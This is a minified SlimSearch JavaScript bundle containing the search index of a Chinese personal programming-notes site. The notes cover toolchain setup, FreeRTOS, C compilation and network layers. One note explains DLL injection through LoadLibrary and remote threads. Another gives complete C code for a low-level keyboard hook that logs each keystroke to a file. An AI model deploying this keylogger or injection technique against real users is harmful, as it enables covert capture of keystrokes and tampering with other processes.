const nt="ENTRIES",V="KEYS",T="VALUES",F="";class D{set;_type;_path;constructor(t,s){const n=t._tree,u=Array.from(n.keys());this.set=t,this._type=s,this._path=u.length>0?[{node:n,keys:u}]:[]}next(){const t=this.dive();return this.backtrack(),t}dive(){if(this._path.length===0)return{done:!0,value:void 0};const{node:t,keys:s}=E(this._path);if(E(s)===F)return{done:!1,value:this.result()};const n=t.get(E(s));return this._path.push({node:n,keys:Array.from(n.keys())}),this.dive()}backtrack(){if(this._path.length===0)return;const t=E(this._path).keys;t.pop(),!(t.length>0)&&(this._path.pop(),this.backtrack())}key(){return this.set._prefix+this._path.map(({keys:t})=>E(t)).filter(t=>t!==F).join("")}value(){return E(this._path).node.get(F)}result(){switch(this._type){case T:return this.value();case V:return this.key();default:return[this.key(),this.value()]}}[Symbol.iterator](){return this}}const E=e=>e[e.length-1],ut=(e,t,s)=>{const n=new Map;if(t===void 0)return n;const u=t.length+1,o=u+s,i=new Uint8Array(o*u).fill(s+1);for(let r=0;r<u;++r)i[r]=r;for(let r=1;r<o;++r)i[r*u]=r;return R(e,t,s,n,i,1,u,""),n},R=(e,t,s,n,u,o,i,r)=>{const d=o*i;t:for(const l of e.keys())if(l===F){const a=u[d-1];a<=s&&n.set(r,[e.get(l),a])}else{let a=o;for(let h=0;h<l.length;++h,++a){const m=l[h],p=i*a,f=p-i;let c=u[p];const g=Math.max(0,a-s-1),_=Math.min(i-1,a+s);for(let y=g;y<_;++y){const b=m!==t[y],z=u[f+y]+ +b,A=u[f+y+1]+1,w=u[p+y]+1,L=u[p+y+1]=Math.min(z,A,w);L<c&&(c=L)}if(c>s)continue t}R(e.get(l),t,s,n,u,a,i,r+l)}};class C{_tree;_prefix;_size=void 0;constructor(t=new Map,s=""){this._tree=t,this._prefix=s}atPrefix(t){if(!t.startsWith(this._prefix))throw new Error("Mismatched prefix");const[s,n]=x(this._tree,t.slice(this._prefix.length));if(s===void 0){const[u,o]=M(n);for(const i of u.keys())if(i!==F&&i.startsWith(o)){const r=new Map;return r.set(i.slice(o.length),u.get(i)),new C(r,t)}}return new C(s,t)}clear(){this._size=void 0,this._tree.clear()}delete(t){return this._size=void 0,ot(this._tree,t)}entries(){return new D(this,nt)}forEach(t){for(const[s,n]of this)t(s,n,this)}fuzzyGet(t,s){return ut(this._tree,t,s)}get(t){const s=I(this._tree,t);return s!==void 0?s.get(F):void 0}has(t){const s=I(this._tree,t);return s!==void 0&&s.has(F)}keys(){return new D(this,V)}set(t,s){if(typeof t!="string")throw new Error("key must be a string");return this._size=void 0,O(this._tree,t).set(F,s),this}get size(){if(this._size)return this._size;this._size=0;const t=this.entries();for(;!t.next().done;)this._size+=1;return this._size}update(t,s){if(typeof t!="string")throw new Error("key must be a string");this._size=void 0;const n=O(this._tree,t);return n.set(F,s(n.get(F))),this}fetch(t,s){if(typeof t!="string")throw new Error("key must be a string");this._size=void 0;const n=O(this._tree,t);let u=n.get(F);return u===void 0&&n.set(F,u=s()),u}values(){return new D(this,T)}[Symbol.iterator](){return this.entries()}static from(t){const s=new C;for(const[n,u]of t)s.set(n,u);return s}static fromObject(t){return C.from(Object.entries(t))}}const x=(e,t,s=[])=>{if(t.length===0||e==null)return[e,s];for(const n of e.keys())if(n!==F&&t.startsWith(n))return s.push([e,n]),x(e.get(n),t.slice(n.length),s);return s.push([e,t]),x(void 0,"",s)},I=(e,t)=>{if(t.length===0||e==null)return e;for(const s of e.keys())if(s!==F&&t.startsWith(s))return I(e.get(s),t.slice(s.length))},O=(e,t)=>{const s=t.length;t:for(let n=0;e&&n<s;){for(const o of e.keys())if(o!==F&&t[n]===o[0]){const i=Math.min(s-n,o.length);let r=1;for(;r<i&&t[n+r]===o[r];)++r;const d=e.get(o);if(r===o.length)e=d;else{const l=new Map;l.set(o.slice(r),d),e.set(t.slice(n,n+r),l),e.delete(o),e=l}n+=r;continue t}const u=new Map;return e.set(t.slice(n),u),u}return e},ot=(e,t)=>{const[s,n]=x(e,t);if(s!==void 0){if(s.delete(F),s.size===0)W(n);else if(s.size===1){const[u,o]=s.entries().next().value;q(n,u,o)}}},W=e=>{if(e.length===0)return;const[t,s]=M(e);if(t.delete(s),t.size===0)W(e.slice(0,-1));else if(t.size===1){const[n,u]=t.entries().next().value;n!==F&&q(e.slice(0,-1),n,u)}},q=(e,t,s)=>{if(e.length===0)return;const[n,u]=M(e);n.set(u+t,s),n.delete(u)},M=e=>e[e.length-1],it=(e,t)=>{const s=e._idToShortId.get(t);if(s!=null)return e._storedFields.get(s)},rt=/[\n\r -#%-*,-/:;?@[-\]_{}\u00A0\u00A1\u00A7\u00AB\u00B6\u00B7\u00BB\u00BF\u037E\u0387\u055A-\u055F\u0589\u058A\u05BE\u05C0\u05C3\u05C6\u05F3\u05F4\u0609\u060A\u060C\u060D\u061B\u061E\u061F\u066A-\u066D\u06D4\u0700-\u070D\u07F7-\u07F9\u0830-\u083E\u085E\u0964\u0965\u0970\u09FD\u0A76\u0AF0\u0C77\u0C84\u0DF4\u0E4F\u0E5A\u0E5B\u0F04-\u0F12\u0F14\u0F3A-\u0F3D\u0F85\u0FD0-\u0FD4\u0FD9\u0FDA\u104A-\u104F\u10FB\u1360-\u1368\u1400\u166E\u1680\u169B\u169C\u16EB-\u16ED\u1735\u1736\u17D4-\u17D6\u17D8-\u17DA\u1800-\u180A\u1944\u1945\u1A1E\u1A1F\u1AA0-\u1AA6\u1AA8-\u1AAD\u1B5A-\u1B60\u1BFC-\u1BFF\u1C3B-\u1C3F\u1C7E\u1C7F\u1CC0-\u1CC7\u1CD3\u2000-\u200A\u2010-\u2029\u202F-\u2043\u2045-\u2051\u2053-\u205F\u207D\u207E\u208D\u208E\u2308-\u230B\u2329\u232A\u2768-\u2775\u27C5\u27C6\u27E6-\u27EF\u2983-\u2998\u29D8-\u29DB\u29FC\u29FD\u2CF9-\u2CFC\u2CFE\u2CFF\u2D70\u2E00-\u2E2E\u2E30-\u2E4F\u3000-\u3003\u3008-\u3011\u3014-\u301F\u3030\u303D\u30A0\u30FB\uA4FE\uA4FF\uA60D-\uA60F\uA673\uA67E\uA6F2-\uA6F7\uA874-\uA877\uA8CE\uA8CF\uA8F8-\uA8FA\uA8FC\uA92E\uA92F\uA95F\uA9C1-\uA9CD\uA9DE\uA9DF\uAA5C-\uAA5F\uAADE\uAADF\uAAF0\uAAF1\uABEB\uFD3E\uFD3F\uFE10-\uFE19\uFE30-\uFE52\uFE54-\uFE61\uFE63\uFE68\uFE6A\uFE6B\uFF01-\uFF03\uFF05-\uFF0A\uFF0C-\uFF0F\uFF1A\uFF1B\uFF1F\uFF20\uFF3B-\uFF3D\uFF3F\uFF5B\uFF5D\uFF5F-\uFF65]+/u,S="or",$="and",ct="and_not",lt=(e,t)=>{e.includes(t)||e.push(t)},P=(e,t)=>{for(const s of t)e.includes(s)||e.push(s)},N=({score:e},{score:t})=>t-e,ht=()=>new Map,k=e=>{const t=new Map;for(const s of Object.keys(e))t.set(parseInt(s,10),e[s]);return t},G=(e,t)=>Object.prototype.hasOwnProperty.call(e,t)?e[t]:void 0,dt={[S]:(e,t)=>{for(const s of t.keys()){const n=e.get(s);if(n==null)e.set(s,t.get(s));else{const{score:u,terms:o,match:i}=t.get(s);n.score=n.score+u,n.match=Object.assign(n.match,i),P(n.terms,o)}}return e},[$]:(e,t)=>{const s=new Map;for(const n of t.keys()){const u=e.get(n);if(u==null)continue;const{score:o,terms:i,match:r}=t.get(n);P(u.terms,i),s.set(n,{score:u.score+o,terms:u.terms,match:Object.assign(u.match,r)})}return s},[ct]:(e,t)=>{for(const s of t.keys())e.delete(s);return e}},at=(e,t,s,n,u,o)=>{const{k:i,b:r,d}=o;return Math.log(1+(s-t+.5)/(t+.5))*(d+e*(i+1)/(e+i*(1-r+r*n/u)))},ft=e=>(t,s,n)=>{const u=typeof e.fuzzy=="function"?e.fuzzy(t,s,n):e.fuzzy||!1,o=typeof e.prefix=="function"?e.prefix(t,s,n):e.prefix===!0;return{term:t,fuzzy:u,prefix:o}},H=(e,t,s,n)=>{for(const u of Object.keys(e._fieldIds))if(e._fieldIds[u]===s){e._options.logger("warn",`SlimSearch: document with ID ${e._documentIds.get(t)} has changed before removal: term "${n}" was not present in field "${u}". Removing a document after it has changed can corrupt the index!`,"version_conflict");return}},gt=(e,t,s,n)=>{if(!e._index.has(n)){H(e,s,t,n);return}const u=e._index.fetch(n,ht),o=u.get(t);o==null||o.get(s)==null?H(e,s,t,n):o.get(s)<=1?o.size<=1?u.delete(t):o.delete(s):o.set(s,o.get(s)-1),e._index.get(n).size===0&&e._index.delete(n)},mt={k:1.2,b:.7,d:.5},pt={idField:"id",extractField:(e,t)=>e[t],tokenize:e=>e.split(rt),processTerm:e=>e.toLowerCase(),fields:void 0,searchOptions:void 0,storeFields:[],logger:(e,t)=>{typeof console?.[e]=="function"&&console[e](t)},autoVacuum:!0},J={combineWith:S,prefix:!1,fuzzy:!1,maxFuzzy:6,boost:{},weights:{fuzzy:.45,prefix:.375},bm25:mt},Ft={combineWith:$,prefix:(e,t,s)=>t===s.length-1},_t={batchSize:1e3,batchWait:10},U={minDirtFactor:.1,minDirtCount:20},yt={..._t,...U},Y=(e,t=S)=>{if(e.length===0)return new Map;const s=t.toLowerCase();return e.reduce(dt[s])||new Map},B=(e,t,s,n,u,o,i,r,d=new Map)=>{if(u==null)return d;for(const l of Object.keys(o)){const a=o[l],h=e._fieldIds[l],m=u.get(h);if(m==null)continue;let p=m.size;const f=e._avgFieldLength[h];for(const c of m.keys()){if(!e._documentIds.has(c)){gt(e,h,c,s),p-=1;continue}const g=i?i(e._documentIds.get(c),s,e._storedFields.get(c)):1;if(!g)continue;const _=m.get(c),y=e._fieldLength.get(c)[h],b=at(_,p,e._documentCount,y,f,r),z=n*a*g*b,A=d.get(c);if(A){A.score+=z,lt(A.terms,t);const w=G(A.match,s);w?w.push(l):A.match[s]=[l]}else d.set(c,{score:z,terms:[t],match:{[s]:[l]}})}}return d},At=(e,t,s)=>{const n={...e._options.searchOptions,...s},u=(n.fields||e._options.fields).reduce((c,g)=>({...c,[g]:G(n.boost,g)||1}),{}),{boostDocument:o,weights:i,maxFuzzy:r,bm25:d}=n,{fuzzy:l,prefix:a}={...J.weights,...i},h=e._index.get(t.term),m=B(e,t.term,t.term,1,h,u,o,d);let p,f;if(t.prefix&&(p=e._index.atPrefix(t.term)),t.fuzzy){const c=t.fuzzy===!0?.2:t.fuzzy,g=c<1?Math.min(r,Math.round(t.term.length*c)):c;g&&(f=e._index.fuzzyGet(t.term,g))}if(p)for(const[c,g]of p){const _=c.length-t.term.length;if(!_)continue;f?.delete(c);const y=a*c.length/(c.length+.3*_);B(e,t.term,c,y,g,u,o,d,m)}if(f)for(const c of f.keys()){const[g,_]=f.get(c);if(!_)continue;const y=l*c.length/(c.length+_);B(e,t.term,c,y,g,u,o,d,m)}return m},X=(e,t,s={})=>{if(typeof t!="string"){const a={...s,...t,queries:void 0},h=t.queries.map(m=>X(e,m,a));return Y(h,a.combineWith)}const{tokenize:n,processTerm:u,searchOptions:o}=e._options,i={tokenize:n,processTerm:u,...o,...s},{tokenize:r,processTerm:d}=i,l=r(t).flatMap(a=>d(a)).filter(a=>!!a).map(ft(i)).map(a=>At(e,a,i));return Y(l,i.combineWith)},K=(e,t,s={})=>{const n=X(e,t,s),u=[];for(const[o,{score:i,terms:r,match:d}]of n){const l=r.length,a={id:e._documentIds.get(o),score:i*l,terms:Object.keys(d),match:d};Object.assign(a,e._storedFields.get(o)),(s.filter==null||s.filter(a))&&u.push(a)}return u.sort(N),u},Ct=(e,t,s={})=>{s={...e._options.autoSuggestOptions,...s};const n=new Map;for(const{score:o,terms:i}of K(e,t,s)){const r=i.join(" "),d=n.get(r);d!=null?(d.score+=o,d.count+=1):n.set(r,{score:o,terms:i,count:1})}const u=[];for(const[o,{score:i,terms:r,count:d}]of n)u.push({suggestion:o,terms:r,score:i/d});return u.sort(N),u};class Et{_options;_index;_documentCount;_documentIds;_idToShortId;_fieldIds;_fieldLength;_avgFieldLength;_nextId;_storedFields;_dirtCount;_currentVacuum;_enqueuedVacuum;_enqueuedVacuumConditions;constructor(t){if(t?.fields==null)throw new Error('SlimSearch: option "fields" must be provided');const s=t.autoVacuum==null||t.autoVacuum===!0?yt:t.autoVacuum;this._options={...pt,...t,autoVacuum:s,searchOptions:{...J,...t.searchOptions||{}},autoSuggestOptions:{...Ft,...t.autoSuggestOptions||{}}},this._index=new C,this._documentCount=0,this._documentIds=new Map,this._idToShortId=new Map,this._fieldIds={},this._fieldLength=new Map,this._avgFieldLength=[],this._nextId=0,this._storedFields=new Map,this._dirtCount=0,this._currentVacuum=null,this._enqueuedVacuum=null,this._enqueuedVacuumConditions=U,this.addFields(this._options.fields)}get isVacuuming(){return this._currentVacuum!=null}get dirtCount(){return this._dirtCount}get dirtFactor(){return this._dirtCount/(1+this._documentCount+this._dirtCount)}get documentCount(){return this._documentCount}get termCount(){return this._index.size}toJSON(){const t=[];for(const[s,n]of this._index){const u={};for(const[o,i]of n)u[o]=Object.fromEntries(i);t.push([s,u])}return{documentCount:this._documentCount,nextId:this._nextId,documentIds:Object.fromEntries(this._documentIds),fieldIds:this._fieldIds,fieldLength:Object.fromEntries(this._fieldLength),averageFieldLength:this._avgFieldLength,storedFields:Object.fromEntries(this._storedFields),dirtCount:this._dirtCount,index:t,serializationVersion:2}}addFields(t){for(let s=0;s<t.length;s++)this._fieldIds[t[s]]=s}}const zt=({index:e,documentCount:t,nextId:s,documentIds:n,fieldIds:u,fieldLength:o,averageFieldLength:i,storedFields:r,dirtCount:d,serializationVersion:l},a)=>{if(l!==1&&l!==2)throw new Error("SlimSearch: cannot deserialize an index created with an incompatible version");const h=new Et(a);h._documentCount=t,h._nextId=s,h._documentIds=k(n),h._idToShortId=new Map,h._fieldIds=u,h._fieldLength=k(o),h._avgFieldLength=i,h._storedFields=k(r),h._dirtCount=d||0,h._index=new C;for(const[m,p]of h._documentIds)h._idToShortId.set(p,m);for(const[m,p]of e){const f=new Map;for(const c of Object.keys(p)){let g=p[c];l===1&&(g=g.ds),f.set(parseInt(c,10),k(g))}h._index.set(m,f)}return h},Q=Object.entries,wt=Object.fromEntries,j=(e,t)=>{const s=e.toLowerCase(),n=t.toLowerCase(),u=[];let o=0,i=0;const r=(l,a=!1)=>{let h="";i===0?h=l.length>20?`… ${l.slice(-20)}`:l:a?h=l.length+i>100?`${l.slice(0,100-i)}… `:l:h=l.length>20?`${l.slice(0,20)} … ${l.slice(-20)}`:l,h&&u.push(h),i+=h.length,a||(u.push(["mark",t]),i+=t.length,i>=100&&u.push(" …"))};let d=s.indexOf(n,o);if(d===-1)return null;for(;d>=0;){const l=d+n.length;if(r(e.slice(o,d)),o=l,i>100)break;d=s.indexOf(n,o)}return i<100&&r(e.slice(o),!0),u},Z=/[\u4e00-\u9fa5]/g,tt=(e={})=>({fuzzy:.2,prefix:!0,processTerm:t=>{const s=t.match(Z)||[],n=t.replace(Z,"").toLowerCase();return n?[n,...s]:[...s]},...e}),xt=(e,t)=>t.contents.reduce((s,[,n])=>s+n,0)-e.contents.reduce((s,[,n])=>s+n,0),kt=(e,t)=>Math.max(...t.contents.map(([,s])=>s))-Math.max(...e.contents.map(([,s])=>s)),et=(e,t,s={})=>{const n={};return K(t,e,tt({boost:{h:2,t:1,c:4},...s})).forEach(u=>{const{id:o,terms:i,score:r}=u,d=o.includes("@"),l=o.includes("#"),[a,h]=o.split(/[#@]/),m=i.sort((f,c)=>f.length-c.length).filter((f,c)=>i.slice(c+1).every(g=>!g.includes(f))),{contents:p}=n[a]??={title:"",contents:[]};if(d)p.push([{type:"customField",key:a,index:h,display:m.map(f=>u.c.map(c=>j(c,f))).flat().filter(f=>f!==null)},r]);else{const f=m.map(c=>j(u.h,c)).filter(c=>c!==null);if(f.length&&p.push([{type:l?"heading":"title",key:a,...l&&{anchor:h},display:f},r]),"t"in u)for(const c of u.t){const g=m.map(_=>j(c,_)).filter(_=>_!==null);g.length&&p.push([{type:"text",key:a,...l&&{anchor:h},display:g},r])}}}),Q(n).sort(([,u],[,o])=>"max"==="total"?xt(u,o):kt(u,o)).map(([u,{title:o,contents:i}])=>{if(!o){const r=it(t,u);r&&(o=r.h)}return{title:o,contents:i.map(([r])=>r)}})},st=(e,t,s={})=>Ct(t,e,tt(s)).map(({suggestion:n})=>n),v=wt(Q(JSON.parse("{\"/\":{\"documentCount\":14,\"nextId\":14,\"documentIds\":{\"0\":\"v-8daa1a0e\",\"1\":\"v-0aeeffb2\",\"2\":\"v-584abf60\",\"3\":\"v-d138e06a\",\"4\":\"v-2d8a340c\",\"5\":\"v-fc2e16e2\",\"6\":\"v-5a38f0e7\",\"7\":\"v-1f35fe74\",\"8\":\"v-1760fc80\",\"9\":\"v-f06deeae\",\"10\":\"v-3eaf88e8\",\"11\":\"v-2ec10888\",\"12\":\"v-0a2d1b07\",\"13\":\"v-65a31018\"},\"fieldIds\":{\"h\":0,\"t\":1,\"c\":2},\"fieldLength\":{\"0\":[1,1],\"1\":[1,36],\"2\":[1,23],\"3\":[1,66],\"4\":[1,13],\"5\":[1,81],\"6\":[1,41],\"7\":[1,2],\"8\":[1,62],\"9\":[1,73],\"10\":[1],\"11\":[1],\"12\":[1],\"13\":[1]},\"averageFieldLength\":[1,39.8],\"storedFields\":{\"0\":{\"h\":\"鱼头笔记\",\"t\":[\"鱼头笔记\"]},\"1\":{\"h\":\"\",\"t\":[\"下载： https://github.com/niXman/mingw-builds-binaries/releases x86_64-12.2.0-release-posix-seh-rt_v10-rev1.7z 解压：D:\\\\c\\\\mingw64 配置到path 配置 clion file->setting->build->toolchains-> + 添加 \"]},\"2\":{\"h\":\"\",\"t\":[\" 第一章 FreeRTOS移植到STM32 第二章 FreeRTOS创建任务 第三章 FreeRTOS任务管理 第四章 FreeRTOS消息队列 第五章 FreeRTOS信号量 第六章 FreeRTOS互斥量 第七章 FreeRTOS事件组 第八章 FreeRTOS任务通知 第九章 FreeRTOS软件定时器 第十章 FreeRTOS内存管理 第十一章 FreeRTOS中断管理 \"]},\"3\":{\"h\":\"\",\"t\":[\"C 编译过程\",\"gcc ***.c\",\" 1.预处理 译过程的第一步预就是预处理，与处理结束后会产生一个后缀为(.i)的临时文件，这一步由预处理器完成。预处理器主要完成以下任务。 删除所有的注释 宏扩展 文件包含 g++ -E text.cpp -o text.i 2.编译 C 中的编译阶段使用内置编译器软件将 （.i） 临时文件转换为具有汇编级指令（低级代码）的汇编文件 （.s）。 汇编代码是一种简单的英文语言，用于编写低级指令（在微控制器程序中，我们使用汇编语言）。 整个程序代码由编译器软件一次性解析（语法分析），并通过终端窗口告诉我们源代码中存在的任何语法错误或警告。 g++ -S text.i -o text.s 3.汇编 使用汇编程序将程序集级代码（.s 文件）转换为机器可理解的代码（二进制/十六进制形式）。 汇编程序是一个预先编写的程序，它将汇编代码转换为机器代码。 它从汇编文件中获取基本指令，并将其转换为特定于计算机类型（称为目标代码）的二进制/十六进制代码。 g++ -c text.s -o text.o 4.连接 链接是将库文件包含在我们的程序中的过程。 库文件是一些预定义的文件，其中包含机器语言中的函数定义，这些文件的扩展名为.lib。 链接过程会生成一个可执行文件，其扩展名为 .exe 在Linux 操作系统中为 .out g++ text.o -o mybin ld.exe 连接器 \"]},\"4\":{\"h\":\"\",\"t\":[\" 常量： #define URl \\\"http://xxxxx.xxx\\\" const long aa = 111L; 宏定义： \"]},\"5\":{\"h\":\"\",\"t\":[\"常用的网络协议\",\"物理层（Physical Layer）：负责传输数据的物理媒介和比特流，例如电缆、光纤、无线信号等。 数据链路层（Data Link Layer）：提供对物理层传输的比特流进行分帧和差错校验，确保可靠的数据传输，例如以太网协议。 以太网（Ethernet）：是最常用的局域网技术，定义了数据链路层的帧格式和MAC地址的使用规则。 PPP（Point-to-Point Protocol）：用于在点对点连接上建立和维护数据链路连接，例如拨号连接或串行链路。 HDLC（High-Level Data Link Control）：一种数据链路层协议，用于在点对点或点对多点的通信链路上提供可靠的数据传输。 SLIP（Serial Line Internet Protocol）：一种简单的数据链路层协议，通常用于串行线路上的IP数据传输。 PPPoE（Point-to-Point Protocol over Ethernet）：在以太网上运行的一种协议，将PPP封装在以太网帧中，用于在宽带接入网络中建立和维护连接。 Wi-Fi（Wireless Fidelity）：无线局域网技术，定义了无线数据链路层的帧格式和协议，如IEEE 802.11系列标准。 网络层（Network Layer）：处理分组的路由和转发，实现不同网络之间的数据传输，例如IP协议。 传输层（Transport Layer）：提供端到端的可靠数据传输，包括分段、流量控制和错误恢复，例如TCP协议和UDP协议。 会话层（Session Layer）：建立、管理和终止会话（连接）中的通信会话，例如会话控制协议。 表示层（Presentation Layer）：处理数据的表示格式，包括数据加密、压缩和格式转换，例如加密协议和压缩协议。 应用层（Application Layer）：提供网络应用服务和用户接口，例如HTTP协议、FTP协议、SMTP协议等。 \"]},\"6\":{\"h\":\"\",\"t\":[\"================== dll 注入原理 首先我们知道在windows上面如果引入一个dll的话，那么需要用到一个函数 loadlibrary() 这个函数是用来引入外部dll的 因为这个函数在系统的kernel32.dll里面，所有软件都会引入包含这个dll, 而且都是使用同一份，所以在所有软件里面，这个 dll的基地址是固定的 我们其实主要是要用到它里面的一个函数， loadlibrary() 地址，你们想，既然所有软件这个dll的基址都是一样，那么它里面 的函数肯定也是一样的。那这就好办了，我们只需要在我们自己的程序，比如这个注入工具里面自己获取自己的loadlibrary()地 址，不就知道程序里面的loadlibrary()函数地址了么， 知道这个地址后,通过进程打开程序获取程序的句柄，然后写入我们的dll的路径，用远程线程方式去执行这个这个函数，程序就自己 引入我们的dll从而注入到程序内部，这个时候我们想怎么操作程序内存数据都没问题 =================== 工具 onlly Debug Cheat Engine \",\" \"]},\"7\":{\"h\":\"每日仪式\",\"t\":[\"sssssss\",\"ss\"]},\"8\":{\"h\":\"\",\"t\":[\" #include <stdio.h> #include <Windows.h> LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) { if (nCode >= 0 && wParam == WM_KEYDOWN) { KBDLLHOOKSTRUCT* pKeyStruct = (KBDLLHOOKSTRUCT*)lParam; DWORD vkCode = pKeyStruct->vkCode; FILE* file = fopen(\\\"xxx.txt\\\", \\\"a\\\"); if (file != NULL) { fprintf(file, \\\"%ld\\\\n\\\", vkCode); fclose(file); } } return CallNextHookEx(NULL, nCode, wParam, lParam); } int main() { // 设置键盘钩子 HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0); if (hook == NULL) { printf(\\\"Failed to install hook\\\\n\\\"); return 1; } // 消息循环，等待键盘事件 MSG msg; while (GetMessage(&msg, NULL, 0, 0) != 0) { TranslateMessage(&msg); DispatchMessage(&msg); } // 卸载键盘钩子 UnhookWindowsHookEx(hook); return 0; } \"]},\"9\":{\"h\":\"\",\"t\":[\"CMakeLists.txt\",\"target_link_libraries(untitled1 D:/c/mingw64/x86_64-w64-mingw32/lib/libiphlpapi.a)\",\" #include <stdio.h> #include <winsock2.h> #include <iphlpapi.h> #include <windows.h> int main() { PIP_ADAPTER_ADDRESSES pAddresses = NULL; ULONG outBufLen = 0; // 获取缓冲区大小 if (GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddresses, &outBufLen) == ERROR_BUFFER_OVERFLOW) { // 分配足够的缓冲区 pAddresses = (IP_ADAPTER_ADDRESSES*)malloc(outBufLen); } // 获取网卡列表 if (GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddresses, &outBufLen) == NO_ERROR) { PIP_ADAPTER_ADDRESSES pCurrAddresses = pAddresses; int i = 1; // 遍历网卡列表并打印信息 while (pCurrAddresses) { printf(\\\" 序号: %d. %ws \\\\n\\\", i++, pCurrAddresses->FriendlyName); printf(\\\" 描述: %ws \\\\n\\\", pCurrAddresses->Description); printf(\\\" Adapter ID: %ws \\\\n\\\", pCurrAddresses->AdapterName); printf(\\\"\\\\n\\\\n\\\\n\\\"); pCurrAddresses = pCurrAddresses->Next; } } // 释放内存 if (pAddresses) { free(pAddresses); } return 0; } \"]},\"10\":{\"h\":\"C\"},\"11\":{\"h\":\"编程语言\"},\"12\":{\"h\":\"个人理解\"},\"13\":{\"h\":\"Ex\"}},\"dirtCount\":0,\"index\":[[\"个人理解\",{\"0\":{\"12\":1}}],[\"编程语言\",{\"0\":{\"11\":1}}],[\"编译\",{\"1\":{\"3\":1}}],[\"编译过程\",{\"1\":{\"3\":1}}],[\"释放内存\",{\"1\":{\"9\":1}}],[\"描述\",{\"1\":{\"9\":1}}],[\"序号\",{\"1\":{\"9\":1}}],[\"遍历网卡列表并打印信息\",{\"1\":{\"9\":1}}],[\"获取网卡列表\",{\"1\":{\"9\":1}}],[\"获取缓冲区大小\",{\"1\":{\"9\":1}}],[\"分配足够的缓冲区\",{\"1\":{\"9\":1}}],[\"ulong\",{\"1\":{\"9\":1}}],[\"unspec\",{\"1\":{\"9\":2}}],[\"untitled1\",{\"1\":{\"9\":1}}],[\"unhookwindowshookex\",{\"1\":{\"8\":1}}],[\"url\",{\"1\":{\"4\":1}}],[\"卸载键盘钩子\",{\"1\":{\"8\":1}}],[\"等待键盘事件\",{\"1\":{\"8\":1}}],[\"消息循环\",{\"1\":{\"8\":1}}],[\"设置键盘钩子\",{\"1\":{\"8\":1}}],[\"vkcode\",{\"1\":{\"8\":2}}],[\"v10\",{\"1\":{\"1\":1}}],[\"keyboard\",{\"1\":{\"8\":1}}],[\"keydown\",{\"1\":{\"8\":1}}],[\"kbdllhookstruct\",{\"1\":{\"8\":2}}],[\"ws\",{\"1\":{\"9\":3}}],[\"w64\",{\"1\":{\"9\":1}}],[\"while\",{\"1\":{\"8\":1,\"9\":1}}],[\"wh\",{\"1\":{\"8\":1}}],[\"wm\",{\"1\":{\"8\":1}}],[\"wparam\",{\"1\":{\"8\":4}}],[\"wireless\",{\"1\":{\"5\":1}}],[\"wi\",{\"1\":{\"5\":1}}],[\"<iphlpapi\",{\"1\":{\"9\":1}}],[\"<winsock2\",{\"1\":{\"9\":1}}],[\"<windows\",{\"1\":{\"8\":1,\"9\":1}}],[\"<stdio\",{\"1\":{\"8\":1,\"9\":1}}],[\"每日仪式\",{\"0\":{\"7\":1}}],[\"工具\",{\"1\":{\"6\":1}}],[\"引入我们的dll从而注入到程序内部\",{\"1\":{\"6\":1}}],[\"程序就自己\",{\"1\":{\"6\":1}}],[\"用远程线程方式去执行这个这个函数\",{\"1\":{\"6\":1}}],[\"用于在宽带接入网络中建立和维护连接\",{\"1\":{\"5\":1}}],[\"用于在点对点或点对多点的通信链路上提供可靠的数据传输\",{\"1\":{\"5\":1}}],[\"用于在点对点连接上建立和维护数据链路连接\",{\"1\":{\"5\":1}}],[\"用于编写低级指令\",{\"1\":{\"3\":1}}],[\"然后写入我们的dll的路径\",{\"1\":{\"6\":1}}],[\"通过进程打开程序获取程序的句柄\",{\"1\":{\"6\":1}}],[\"通常用于串行线路上的ip数据传输\",{\"1\":{\"5\":1}}],[\"知道这个地址后\",{\"1\":{\"6\":1}}],[\"函数地址了么\",{\"1\":{\"6\":1}}],[\"不就知道程序里面的loadlibrary\",{\"1\":{\"6\":1}}],[\"址\",{\"1\":{\"6\":1}}],[\"地\",{\"1\":{\"6\":1}}],[\"地址\",{\"1\":{\"6\":1}}],[\"比如这个注入工具里面自己获取自己的loadlibrary\",{\"1\":{\"6\":1}}],[\"那这就好办了\",{\"1\":{\"6\":1}}],[\"那么它里面\",{\"1\":{\"6\":1}}],[\"那么需要用到一个函数\",{\"1\":{\"6\":1}}],[\"既然所有软件这个dll的基址都是一样\",{\"1\":{\"6\":1}}],[\"你们想\",{\"1\":{\"6\":1}}],[\"我们只需要在我们自己的程序\",{\"1\":{\"6\":1}}],[\"我们其实主要是要用到它里面的一个函数\",{\"1\":{\"6\":1}}],[\"我们使用汇编语言\",{\"1\":{\"3\":1}}],[\"所以在所有软件里面\",{\"1\":{\"6\":1}}],[\"所有软件都会引入包含这个dll\",{\"1\":{\"6\":1}}],[\"而且都是使用同一份\",{\"1\":{\"6\":1}}],[\"因为这个函数在系统的kernel32\",{\"1\":{\"6\":1}}],[\"首先我们知道在windows上面如果引入一个dll的话\",{\"1\":{\"6\":1}}],[\"注入原理\",{\"1\":{\"6\":1}}],[\"af\",{\"1\":{\"9\":2}}],[\"addresses\",{\"1\":{\"9\":3}}],[\"adapter\",{\"1\":{\"9\":4}}],[\"a\",{\"1\":{\"8\":1,\"9\":1}}],[\"application\",{\"1\":{\"5\":1}}],[\"aa\",{\"1\":{\"4\":1}}],[\"应用层\",{\"1\":{\"5\":1}}],[\"压缩和格式转换\",{\"1\":{\"5\":1}}],[\"包括数据加密\",{\"1\":{\"5\":1}}],[\"包括分段\",{\"1\":{\"5\":1}}],[\"处理数据的表示格式\",{\"1\":{\"5\":1}}],[\"处理分组的路由和转发\",{\"1\":{\"5\":1}}],[\"表示层\",{\"1\":{\"5\":1}}],[\"中的通信会话\",{\"1\":{\"5\":1}}],[\"中的编译阶段使用内置编译器软件将\",{\"1\":{\"3\":1}}],[\"管理和终止会话\",{\"1\":{\"5\":1}}],[\"建立\",{\"1\":{\"5\":1}}],[\"会话层\",{\"1\":{\"5\":1}}],[\"流量控制和错误恢复\",{\"1\":{\"5\":1}}],[\"提供网络应用服务和用户接口\",{\"1\":{\"5\":1}}],[\"提供端到端的可靠数据传输\",{\"1\":{\"5\":1}}],[\"提供对物理层传输的比特流进行分帧和差错校验\",{\"1\":{\"5\":1}}],[\"传输层\",{\"1\":{\"5\":1}}],[\"实现不同网络之间的数据传输\",{\"1\":{\"5\":1}}],[\"no\",{\